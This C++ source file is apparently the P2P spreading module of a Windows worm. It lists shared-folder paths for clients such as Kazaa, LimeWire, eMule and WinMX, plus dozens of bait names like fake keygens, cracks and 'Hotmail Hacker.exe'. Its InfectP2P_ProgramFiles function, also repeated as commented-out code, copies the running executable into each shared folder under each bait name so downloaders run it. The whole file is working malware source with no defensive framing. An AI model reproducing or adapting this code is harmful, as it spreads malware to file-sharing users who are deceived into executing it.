#include "../h/includes.h"

char *szProgFilePath[] = 
{
	"kazaa\\my shared folder\\",
	"kazaa lite\\my shared folder\\",
	"kazaa lite k++\\my shared folder\\",
	"icq\\shared folder\\",
	"grokster\\my grokster\\",
	"bearshare\\shared\\",
	"edonkey2000\\incoming\\",	
	"emule\\incoming\\",	
    "morpheus\\my shared folder\\",
	"limewire\\shared\\",
	"tesla\\files\\",
	"winmx\\shared\\",
};

char *szFiles[] =
{
	"Windows 2008 Server KeyGen.exe",
	"DeadSpace KeyGen.exe",
	"Half-Life 2 WORKS-ON-STEAM.exe",
	"Left4Dead-STEAM-Online-Crack-WORKS-DECEMBER08.exe",
	"Password Cracker.exe",
	"FTP Cracker.exe",
	"Hotmail Hacker.exe",
	"Hotmail Cracker.exe",
	"Norton Anti-Virus 2008 Enterprise Crack.exe",
	"Kaspersky 2009 Full Suite Crack.exe",
	"Microsoft Visual C++ 6 KeyGen.exe",
	"Microsoft Visual Basic 6 KeyGen.exe",
	"Microsoft Visual Studio 6 KeyGen.exe",
	"Microsoft Visual Studio 2008 KeyGen.exe",
	"Microsoft Visual Basic 2008 KeyGen.exe",
	"Microsoft Visual C++ 2008 KeyGen.exe",
	"MSN Live Password Cracker.exe",
	"AOL Instant Messenger (AIM) Cracker.exe",
	"AOL Triton Cracker.exe",
	"ICQ Account Cracker.exe",
	"AOL Password Cracker.exe",
	"Counter-Strike KeyGen.exe",
	"Counter-Strike Source KeyGen.exe",
	"DivX Pro KeyGen.exe",
	"RuneScape Cracker.exe",
	"RuneScape Gold Exploit.exe",
	"Windows XP Keygen",
	"Windows XP Crack.exe",
	"Windows Vista Keygen",
	"Widnows Vista Crack.exe",
	"Kaspersky Crck.exe",
	"Kaspersky Keygen.exe",
	"WOW Account Cracker.exe",
	"Project 7 Private 4.8.exe",
	"Virus Generator.exe",
	"Virus Maker.exe",
	"Nod32 Crack.exe",
	"Nod32 Keygen.exe",
	"Steam Account Stealer.exe",
	"Myspace Cracker.exe",
	"Myspace Bruteforce.exe",
	"Myspace Attack.exe",
	"Limewire Pro Downloader.exe",
	"Limewire Speed Patch",
	"Tcpip Patch.exe",
	"MSN Hacker 2008.exe",
	"MSN Hacker 2009.exe",
	"AOL Hacker 2008.exe",
	"AOL Hacker 2009.exe",
	"YIM HAcker 2008.exe",
	"YIM HAcker 2009.exe",
	"PhotoShop Keygen.exe",
	"Adobe Photoshop Keygen.exe",
	"Adobe Photoshop Crack.exe",
	"Photoshop Crack.exe",
	"Adobe Keygen.exe",
	"Adobe Photoshop CS3 Keygen.exe",
	"Adobe Photoshop CS4 KeyGen.exe",
	"RuneScape 2008 - Newest Exploits.exe"
};

bool InfectP2P_ProgramFiles()
{
	Peer2PeerInfo_s *pPeer2PeerInfo_s = new Peer2PeerInfo_s;

	if (pPeer2PeerInfo_s) 
		ZeroMemory(pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
	else
		ExitThread(0);

	//Find ProgramfilesDir//
    PUCHAR strresult = new UCHAR[26];
    PUCHAR progdir = new UCHAR[200];
   
    HKEY key = NULL;
    DWORD datasize = 200;
    DWORD dwRet = 0;

    ZeroMemory((PVOID)strresult,26);

    dwRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",0,KEY_READ,&key);                      
    dwRet = RegQueryValueEx(key,"ProgramFilesDir",NULL,NULL,(LPBYTE)progdir,&datasize);     
    RegCloseKey(key);
    ////////////////////

	GetModuleFileName(GetModuleHandle(NULL), pPeer2PeerInfo_s->szDirectory, sizeof(pPeer2PeerInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szProgFilePath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{      
			char p2pfolder[1024];
			sprintf( p2pfolder, "%s\\%s",
			progdir,
			szProgFilePath[i]);
			strcpy(pPeer2PeerInfo_s->szProgFilePath, p2pfolder);
			strcat(pPeer2PeerInfo_s->szProgFilePath, szFiles[j]);

			if (CopyFile(pPeer2PeerInfo_s->szDirectory, pPeer2PeerInfo_s->szProgFilePath, false) != 0) 
			{ 
				SetFileAttributes(pPeer2PeerInfo_s->szProgFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pPeer2PeerInfo_s;
	return true;
}
/*
bool InfectP2P_ProgramFiles()
{
	Peer2PeerInfo_s *pPeer2PeerInfo_s = new Peer2PeerInfo_s;

	if (pPeer2PeerInfo_s) 
		ZeroMemory(pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
	else
		ExitThread(0);

	//Find ProgramfilesDir//
    PUCHAR strresult = new UCHAR[26];
    PUCHAR progdir = new UCHAR[200];
   
    HKEY key = NULL;
    DWORD datasize = 200;
    DWORD dwRet = 0;
    ZeroMemory((PVOID)strresult,26);

    dwRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",0,KEY_READ,&key);                      
    dwRet = RegQueryValueEx(key,"ProgramFilesDir",NULL,NULL,(LPBYTE)progdir,&datasize);     
    RegCloseKey(key);
    ////////////////////

	GetModuleFileName(GetModuleHandle(NULL), pPeer2PeerInfo_s->szDirectory, sizeof(pPeer2PeerInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{      
			char p2pfolder[1024];
			sprintf( p2pfolder, "%s\\%s",
			progdir,
			szPath[i]);
			strcpy(pPeer2PeerInfo_s->szFilePath, p2pfolder);
			strcat(pPeer2PeerInfo_s->szFilePath, szFiles[j]);

			if (CopyFile(pPeer2PeerInfo_s->szDirectory, pPeer2PeerInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pPeer2PeerInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pPeer2PeerInfo_s;
	return true;
}
*/